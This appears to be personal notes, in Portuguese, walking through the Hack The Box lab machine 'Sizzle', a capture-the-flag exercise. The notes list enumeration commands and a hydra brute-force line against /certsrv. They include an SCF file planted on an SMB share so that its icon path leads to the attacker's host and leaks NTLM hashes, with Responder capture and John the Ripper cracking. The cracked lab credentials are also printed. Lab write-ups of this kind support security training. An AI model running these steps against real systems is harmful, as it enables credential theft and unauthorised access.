Sizzle
========================

# Enumeration

EM ATUALIZACAO... INFOS IMPORTANTES

Dominio: HTB.LOCAL

Users: 
amanda
amanda_adm
bill
bob
chris
henry
joe
jose
lkys37en
morgan
mrb3n

Credenciais obtidas:

usuario: amanda
senha: Ashare1972


    sudo nmap_enum sizzle.htb | tee nmap_output.txt

Descobri que ele aceita conexao FTP anonymous:

    ftp -a sizzle.htb
    
    dir
    mkdir teste

![qownnotes-media-SvJigz](../../../media/qownnotes-media-SvJigz.png)

Com esses comandos deu pra notar que ele nao aceita escrita no diretorio FTP. Partir para o proximo teste:

    enum4linux -a 10.10.10.103 | tee enum4linux.txt
    
![qownnotes-media-YBzfjT](../../../media/qownnotes-media-YBzfjT.png)

USEFUL INFORMATION:

Nome do dominio: *HTB.LOCAL*

## Web enumeration

    gobuster dir -u http://sizzle.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
    gobuster dir -u https://sizzle.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"

![qownnotes-media-EuymVq](../../../media/qownnotes-media-EuymVq.png)

    
    hydra -l admin -P rockyou.txt 10.10.10.103 -s 80 http-get /certsrv
 
 
## RPC enumeration

    rpcclient -U "" -N 10.10.10.103
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
    
![qownnotes-media-wFSYbm](../../../media/qownnotes-media-wFSYbm.png)

## SMB Enumeration (exploitation step)

    smbclient -L 10.10.10.103 -U '' -N
    
    smbclient -L //10.10.10.103
    
Aqui finalmente tivemos algo interessante:

![qownnotes-media-MmNRCh](../../../media/qownnotes-media-MmNRCh.png)

Daqui em diante a gente conseguiu prosseguir com a exploracao e obter o primeiro hash de senha de usuario... [exploitation](Sizzle.md#Exploitation)

## LDAP enumeration

    nmap -Pn -sV -p 389 --script="banner,(ldap* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "tcp_port_ldap_nmap.txt" 10.10.10.103

## DNS Enumeration

Aqui teve uma acao importante que tomei que foi colocando uma entrada no arquivo resolv.conf

    echo "nameserver 10.10.10.103" >> /etc/resolv.conf

    host -t axfr 10.10.10.103 10.10.10.103
    
    host -t axfr 10.10.10.103 HTB.LOCAL
    
    host -t axfr HTB.LOCAL 10.10.10.103
    
    host -t axfr HTB.LOCAL HTB.LOCAL
    
    dnsenum htb.local
    
    nslookup 10.10.10.103 10.10.10.103
    
![qownnotes-media-WSJgnE](../../../media/qownnotes-media-WSJgnE.png)

Nenhum desses deu sucesso

## UDP ports enumeration

    sudo nmap -sU -p 53,161,111,137,139,2049 -Pn 10.10.10.103
  
 
 ![qownnotes-media-bUGHpu](../../../media/qownnotes-media-bUGHpu.png)


## All ports enumeration

    sudo nmap -T5 -Pn -p- 10.10.10.103

# Exploitation  

Geramos um arquivo chamado @exploit.scf ... Esse conteudo pode ser visto em:
<https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/>

![qownnotes-media-XPlcXE](../../../media/qownnotes-media-XPlcXE.png)

    └─$ cat @exploit.scf 
    [Shell]
    Command=2
    IconFile=\\10.10.14.4\smb\uwu.ico
    [Taskbar]
    Command=ToggleDesktop

Subimos o arquivo no servidor alvo:

    smbclient //10.10.10.103/'Departament Shares'
    <Enter> (sem senha)
    cd Users/Public
    put @exploit.scf
    
![qownnotes-media-bonvEI](../../../media/qownnotes-media-bonvEI.png)


Depois disso bastou a gente iniciar o responder para escutar na nossa interface tun0:

    sudo responder -I tun0
    
![qownnotes-media-LHSxCq](../../../media/qownnotes-media-LHSxCq.png)

Com isso, basta copiar esse conteudo e salvar em um arquivo TXT para quebrar com o john the ripper:

    john --wordlist=/usr/share/wordlists/rockyou.txt hashe.txt
    
![qownnotes-media-JOYZgT](../../../media/qownnotes-media-JOYZgT.png)

Credenciais obtidass:

usuario: amanda
senha: Ashare1972

![scribble](../../../media/Teste2.png)

Via certificado, como se autenticar com WINRM


